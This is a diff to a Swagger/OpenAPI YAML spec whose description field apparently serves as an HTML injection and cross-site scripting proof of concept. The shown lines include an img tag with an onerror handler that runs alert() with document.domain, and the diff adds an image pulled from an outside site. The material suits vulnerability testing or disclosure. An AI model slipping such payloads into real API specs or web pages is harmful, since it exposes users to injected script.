@@ -6,6 +6,7 @@ info:
   description: >
     <h2>HTML Injection / XSS PoC</h2>
     <p>Se isso aparece renderizado como HTML, a UI do Swagger aceita conteúdo não confiável.</p>
+    <img src="https://gifdb.com/images/high/lain-498-x-353-gif-eqy1ihowo1e817j6.webp">
     <img src="x" onerror="alert('XSS via info.description - by deneuv: ' + document.domain)">
 
 schemes:
